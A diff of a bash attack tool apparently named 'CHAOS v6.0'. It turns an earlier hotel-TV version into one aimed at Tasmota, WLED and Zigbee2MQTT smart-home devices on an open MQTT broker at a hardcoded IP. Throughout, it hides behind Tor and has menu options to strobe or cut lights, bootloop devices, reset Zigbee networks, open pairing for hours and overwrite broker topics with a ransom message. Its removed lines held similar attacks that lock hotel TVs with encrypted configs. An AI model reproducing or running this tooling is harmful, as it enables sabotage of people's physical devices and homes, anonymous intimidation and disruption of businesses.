@@ -1,194 +1,213 @@
 #!/bin/bash
-# ANARCHY v5.2 - SINGLE BROKER FIXED
+# CHAOS v6.0 - TASMOTA/WLED/ZIGBEE2MQTT ANNIHILATOR
 set -euo pipefail
 
-# SINGLE BROKER ONLY
-HOST_PORT="120.55.14.230:1883"
-HOST="120.55.14.230"
+# TARGET SYSTEM
+HOST="82.22.173.161"
 PORT="1883"
-
 TOR="torsocks"
+
 MAX_BRIGHT="255"
-LOCKED_STATUS="LOCKED-TRUSTEDF57-ANARCHY-v5.2"
-RANSOM_MSG="🔥  HOTEL TV TAKEOVER v5.2 🔥
-TRUSTEDF57 - ALL HOTEL TVS COMPROMISED
+CHAOS_STATUS="TRUSTEDF57 ANARCHY"
+RANSOM_MSG="💀 TRUSTEDF57 TOTAL SYSTEM TAKEOVER v6.0 💀
+ALL LIGHTS/TVs/CONTROLLERS COMPROMISED
 POWER | BRIGHTNESS | CONTROL LOCKED"
 
 ENCRYPT_PAYLOAD() {
-    echo -n "$1" | openssl enc -aes-256-cbc -a -nosalt -k "TRUSTEDF57-ANARCHY" 2>/dev/null | sed 's/=//g'
+    echo -n "$1" | openssl enc -aes-256-cbc -a -nosalt -k "CHAOS-V60-ANNIHILATE" 2>/dev/null | sed 's/=//g'
 }
 
-TOR_PUB_BROKER() {
+TOR_PUB() {
     local topic=$1 payload=$2 qos=2
     [[ $# -eq 3 ]] && qos=$3
     ${TOR} mosquitto_pub -h "${HOST}" -p "${PORT}" -r -q "$qos" -t "$topic" -m "$payload"
 }
 
-discover_targets() {
-    echo "[🔍] DISCOVERING su ${HOST}:${PORT} (30s)..."
+discover_devices() {
+    echo "[🔍] DISCOVERING ${HOST}:${PORT} (30s)..."
     
-    timeout 30 ${TOR} mosquitto_sub -h "${HOST}" -p "${PORT}" -t "#" | \
-    grep -iE "(Hotel/Tv/|/tv/)" 2>/dev/null | \
-    sed 's|^.*/||' | \
-    grep -E '^[a-f0-9]{32}$' | \
-    sort -u > "hotel_tvs.txt" || true
+    timeout 30 ${TOR} mosquitto_sub -h "${HOST}" -p "${PORT}" -t "#" -v | \
+    tee /dev/tty | \
+    grep -E "(Tasmota|wled|zigbee2mqtt)" | \
+    grep -v "zigbee2mqtt/bridge" | \
+    sed 's|.*/||;s|/.*||' | \
+    grep -v '^$' | \
+    sort -u > "chaos_devices.txt"
     
-    if [[ -s "hotel_tvs.txt" ]]; then
-        echo "📺 Trovati:"
-        wc -l "hotel_tvs.txt"
-        head -5 "hotel_tvs.txt"
-    else
-        echo "❌ No TVs, fallback..."
-        echo "5295191d5eb26b6eb2e6189ab7db0c9d" > "hotel_tvs.txt"
-    fi
+    echo "📋 Devices trovati:"
+    grep -E "(Tasmota|wled)" "chaos_devices.txt" | sort -u
+    echo "---"
+    grep "zigbee2mqtt" "chaos_devices.txt" | head -5
 }
 
-load_tvs() {
-    if [[ -f "hotel_tvs.txt" ]]; then
-        mapfile -t HOTEL_TVS < "hotel_tvs.txt"
-        echo "[📺] Caricati ${#HOTEL_TVS[@]} TVs"
+load_devices() {
+    if [[ -f "chaos_devices.txt" ]]; then
+        mapfile -t DEVICES < "chaos_devices.txt"
+        echo "[📱] Caricati ${#DEVICES[@]} devices"
         return 0
     else
-        echo "❌ File TVs mancante! Run discovery"
-        HOTEL_TVS=()
+        echo "❌ Run discovery prima!"
+        DEVICES=()
         return 1
     fi
 }
 
 show_menu() {
     clear
-    TV_COUNT=${#HOTEL_TVS[@]}
+    DEV_COUNT=${#DEVICES[@]}
     cat << EOF
-┌─ TRUSTEDF57 - ${HOST}:${PORT} (${TV_COUNT} TVs) ──┐
-│ 1) 🔍 FULL DISCOVERY (30s)                          │
-│ 2) 📺 FORCE TVs ONLINE                              │
-│ 3) 🔄 POWER BOOTLOOP (ALL)                          │
-│ 4) 💡 MAX BRIGHTNESS 255 (ALL)                      │
-│ 5) 📡 EMQX BROKER RANSOM                            │
-│ 6) 🔒 FULL HOTEL TVS LOCKDOWN                       │
-│ 7) ⚙️ SYS BROKER OVERWRITE                          │
-│ 8) 🔐 ENCRYPT ALL CONFIGS                           │
-│ 9) 🎪 TOTAL ANARCHY v5.2                            │
-│ 0) ❌ EXIT                                          │
-└─────────────────────────────────────────────────────┘
+┌─ TRUSTEDF57- ${HOST}:${PORT} (${DEV_COUNT} DEVICES) ─┐
+│ 1)  FULL SYSTEM DISCOVERY                          │
+│ 2)  STROBE ALL LIGHTS (255/0 LOOP)                 │
+│ 3)  ALL POWER OFF                                  │
+│ 4)  ALL POWER ON + MAX BRIGHT                      │
+│ 5)  RAINBOW DISCO MODE                             │
+│ 6)  MQTT BROKER RANSOM OVERWRITE                   │
+│ 7)  TASMOTA BOOTLOOP CMND                          │
+│ 8)  WLED MATRIX CHAOS                              │
+│ 9)  ZIGBEE2MQTT FLOOD ATTACK                       │
+│ 0)  TOTAL SYSTEM ANNIHILATION                      │
+│ X)  EXIT                                           │
+└──────────────────────────────────────────────────────┘
 EOF
 }
 
-check_tvs_loaded() {
-    [[ ${#HOTEL_TVS[@]} -eq 0 ]] && { 
-        echo "❌ No TVs! Run 1) DISCOVERY"
+check_devices() {
+    [[ ${#DEVICES[@]} -eq 0 ]] && { 
+        echo "❌ No devices! Run 1) DISCOVERY"
         return 1
     }
     return 0
 }
 
-force_all_tvs_online() {
-    check_tvs_loaded || return
-    echo "[📺] ${#HOTEL_TVS[@]} TVs -> ONLINE..."
-    for tv in "${HOTEL_TVS[@]}"; do
-        TOR_PUB_BROKER "Hotel/Tv/${tv}" "ONLINE-LOCKED-TRUSTEDF57" 1
+# TASMOTA ATTACKS
+tasmota_strobe_all() {
+    check_devices || return
+    echo "[💡] STROBE ${#DEVICES[@]} Tasmota..."
+    for dev in "${DEVICES[@]}"; do
+        [[ $dev == Tasmota* ]] || continue
+        TOR_PUB "Tasmota/${dev}/cmnd/Power" "TOGGLE" 1
+        TOR_PUB "Tasmota/${dev}/cmnd/POWER" "1"
+        TOR_PUB "Tasmota/${dev}/cmnd/Bri" "255"
     done
-    echo "✅ Online"
+    echo "✅ Strobe deployed"
 }
 
-tv_power_bootloop_all() {
-    check_tvs_loaded || return
-    echo "[🔄] BOOTLOOP ${#HOTEL_TVS[@]} TVs..."
-    bootloop="POWER1 1;Delay 800;POWER1 0;Delay 400;POWER1 1;Delay 1500;POWER1 0;LOOP"
-    for tv in "${HOTEL_TVS[@]}"; do
-        TOR_PUB_BROKER "Hotel/Tv/${tv}/POWER" "BOOTLOOP-START"
-        TOR_PUB_BROKER "Hotel/Tv/${tv}/CMND" "${bootloop}"
+tasmota_power_off() {
+    check_devices || return
+    echo "[🔴] POWER OFF Tasmota..."
+    for dev in "${DEVICES[@]}"; do
+        [[ $dev == Tasmota* ]] || continue
+        TOR_PUB "Tasmota/${dev}/cmnd/Power" "0"
+    done
+    echo "✅ OFF"
+}
+
+tasmota_max_bright() {
+    check_devices || return
+    echo "[🟢] MAX POWER+BRIGHT Tasmota..."
+    for dev in "${DEVICES[@]}"; do
+        [[ $dev == Tasmota* ]] || continue
+        TOR_PUB "Tasmota/${dev}/cmnd/Power" "1"
+        TOR_PUB "Tasmota/${dev}/cmnd/Bri" "255"
+        TOR_PUB "Tasmota/${dev}/cmnd/Color" "255,255,255"
+    done
+    echo "✅ MAX"
+}
+
+tasmota_bootloop() {
+    check_devices || return
+    echo "[💥] BOOTLOOP Tasmota..."
+    bootloop="Power1;Delay 500;Power0;Delay 300;Power1;Delay 1000;Power0;LOOP"
+    for dev in "${DEVICES[@]}"; do
+        [[ $dev == Tasmota* ]] || continue
+        TOR_PUB "Tasmota/${dev}/cmnd/Backlog" "${bootloop}"
     done
     echo "✅ Bootloop"
 }
 
-max_brightness_all() {
-    check_tvs_loaded || return
-    echo "[💡] BRIGHTNESS 255 ${#HOTEL_TVS[@]} TVs..."
-    for tv in "${HOTEL_TVS[@]}"; do
-        TOR_PUB_BROKER "Hotel/Tv/${tv}/POWER" "1"
-        TOR_PUB_BROKER "Hotel/Tv/${tv}/BRIGHTNESS" "${MAX_BRIGHT}"
-        TOR_PUB_BROKER "Hotel/Tv/${tv}" "MAX-BRIGHT-LOCKED"
+# WLED ATTACKS
+wled_rainbow_disco() {
+    check_devices || return
+    echo "[🌈] RAINBOW DISCO WLED..."
+    for dev in "${DEVICES[@]}"; do
+        [[ $dev == wled* ]] || continue
+        TOR_PUB "wled/${dev}/win" "T"  # White temp
+        TOR_PUB "wled/${dev}/fx" "38"  # Rainbow
+        TOR_PUB "wled/${dev}/bri" "255"
+        TOR_PUB "wled/${dev}/sx" "255" # Speed max
     done
-    echo "✅ Max brightness"
+    echo "✅ Disco mode"
 }
 
-emqx_ransom() {
-    echo "[📡] RANSOM ${HOST}:${PORT}..."
-    TOR_PUB_BROKER "\$SYS/brokers/emqx@127.0.0.1/sysdescr" "${RANSOM_MSG}"
-    TOR_PUB_BROKER "\$SYS/brokers/emqx@127.0.0.1/version" "${LOCKED_STATUS}"
-    TOR_PUB_BROKER "\$SYS/brokers" "ANARCHY-v5.2"
+wled_matrix_chaos() {
+    check_devices || return
+    echo "[🌈] MATRIX CHAOS WLED..."
+    chaos_seq="fx 73;sx 255;ix 255;Delay 2000;fx 45;sx 128;ix 0;Delay 3000;fx 12;sx 255;ix 128"
+    for dev in "${DEVICES[@]}"; do
+        [[ $dev == wled* ]] || continue
+        TOR_PUB "wled/${dev}/win" "F"  # FX mode
+        TOR_PUB "wled/${dev}/bri" "255"
+        TOR_PUB "wled/${dev}/backlog" "${chaos_seq}"
+    done
+    echo "✅ Matrix chaos"
+}
+
+# ZIGBEE2MQTT FLOOD
+zigbee_flood() {
+    check_devices || return
+    echo "[🏠] ZIGBEE FLOOD ATTACK..."
+    TOR_PUB "zigbee2mqtt/bridge/request/lan/action" '{"action": "permit_join", "permit_join": {"duration": 65535}}'
+    TOR_PUB "zigbee2mqtt/bridge/request/network/reset" '{"network": "reset"}'
+    for dev in "${DEVICES[@]}"; do
+        [[ $dev == zigbee2mqtt* ]] || continue
+        TOR_PUB "zigbee2mqtt/${dev}/set" '{"state": "TOGGLE"}'
+    done
+    echo "✅ Flooded"
+}
+
+# GLOBAL ATTACKS
+broker_ransom() {
+    echo "[🔒] BROKER RANSOM..."
+    TOR_PUB "\$SYS/brokers/${HOST}/sysdescr" "${RANSOM_MSG}"
+    TOR_PUB "\$SYS/brokers/${HOST}/version" "${CHAOS_STATUS}"
+    TOR_PUB "zigbee2mqtt/bridge/state" '{"state": "ANNIHILATED"}'
     echo "✅ Ransomed"
 }
 
-hotel_tvs_lockdown() {
-    check_tvs_loaded || return
-    echo "[🔒] LOCKDOWN ${#HOTEL_TVS[@]} TVs..."
-    locked_data="{\"status\":\"${LOCKED_STATUS}\",\"brightness\":${MAX_BRIGHT},\"power\":\"1\"}"
-    crypt_data=$(ENCRYPT_PAYLOAD "${locked_data}")
-    
-    for tv in "${HOTEL_TVS[@]}"; do
-        TOR_PUB_BROKER "Hotel/Tv/${tv}" "${LOCKED_STATUS}"
-        TOR_PUB_BROKER "Hotel/Tv/${tv}/status" "${crypt_data}"
-        TOR_PUB_BROKER "Hotel/Tv/${tv}/config" "${crypt_data}"
-    done
-    echo "✅ Locked"
+total_annihilation() {
+    check_devices || return
+    echo "🎯 TOTAL ANNIHILATION v6.0..."
+    tasmota_power_off
+    sleep 1; tasmota_max_bright
+    sleep 2; wled_rainbow_disco
+    sleep 2; tasmota_strobe_all
+    sleep 2; broker_ransom
+    sleep 2; zigbee_flood
+    sleep 2; tasmota_bootloop
+    sleep 2; wled_matrix_chaos
+    echo "💀 SYSTEM ANNIHILATED!"
 }
 
-sys_broker_overwrite() {
-    echo "[⚙️] SYS OVERWRITE..."
-    TOR_PUB_BROKER "\$SYS/brokers/emqx@127.0.0.1/sysdescr" "ANARCHY-EMQX-v5.2"
-    TOR_PUB_BROKER "\$SYS/brokers" "${LOCKED_STATUS}"
-    TOR_PUB_BROKER "\$SYS/brokers/emqx@127.0.0.1/version" "5.2-COMPROMISED"
-    echo "✅ Overwritten"
-}
-
-all_configs_encrypted() {
-    check_tvs_loaded || return
-    echo "[🔐] ENCRYPT ${#HOTEL_TVS[@]} CONFIGS..."
-    encrypt_payload="{\"v\":\"5.2\",\"status\":\"ENCRYPTED\",\"control\":\"BLOCKED\"}"
-    crypt_payload=$(ENCRYPT_PAYLOAD "${encrypt_payload}")
-    
-    for tv in "${HOTEL_TVS[@]}"; do
-        TOR_PUB_BROKER "Hotel/Tv/${tv}/config" "${crypt_payload}"
-        TOR_PUB_BROKER "Hotel/Tv/${tv}/status" "${crypt_payload}"
-        TOR_PUB_BROKER "Hotel/Tv/${tv}/power" "${crypt_payload}"
-        TOR_PUB_BROKER "Hotel/Tv/${tv}/brightness" "${crypt_payload}"
-    done
-    echo "✅ Encrypted"
-}
-
-total_anarchy_v52() {
-    check_tvs_loaded || return
-    echo "🎪 TOTAL ANARCHY v5.2 - ${#HOTEL_TVS[@]} TVs..."
-    force_all_tvs_online
-    sleep 2; tv_power_bootloop_all
-    sleep 2; max_brightness_all
-    sleep 2; emqx_ransom
-    sleep 2; hotel_tvs_lockdown
-    sleep 2; sys_broker_overwrite
-    sleep 2; all_configs_encrypted
-    echo "🎉 ANARCHY COMPLETE!"
-}
-
-# MAIN LOOP
-HOTEL_TVS=()
-clear; echo "🏨 ANARCHY v5.2 - ${HOST}:${PORT}"
+# MAIN
+DEVICES=()
+clear; echo "💀 CHAOS v6.0 - ${HOST}:${PORT} - HOME ANNIHILATOR"
 
 while true; do
     show_menu
     read -r CHOICE
     case "${CHOICE}" in
-        1) discover_targets; load_tvs ;;
-        2) force_all_tvs_online ;;
-        3) tv_power_bootloop_all ;;
-        4) max_brightness_all ;;
-        5) emqx_ransom ;;
-        6) hotel_tvs_lockdown ;;
-        7) sys_broker_overwrite ;;
-        8) all_configs_encrypted ;;
-        9) total_anarchy_v52 ;;
-        0) echo "EXIT"; exit 0 ;;
+        1) discover_devices; load_devices ;;
+        2) tasmota_strobe_all ;;
+        3) tasmota_power_off ;;
+        4) tasmota_max_bright ;;
+        5) wled_rainbow_disco ;;
+        6) broker_ransom ;;
+        7) tasmota_bootloop ;;
+        8) wled_matrix_chaos ;;
+        9) zigbee_flood ;;
+        0) total_annihilation ;;
+        [Xx]) echo "EXIT"; exit 0 ;;
         *) echo "❌ ${CHOICE} invalido" ;;
     esac
     echo; read -p "⏸️  ENTER..."
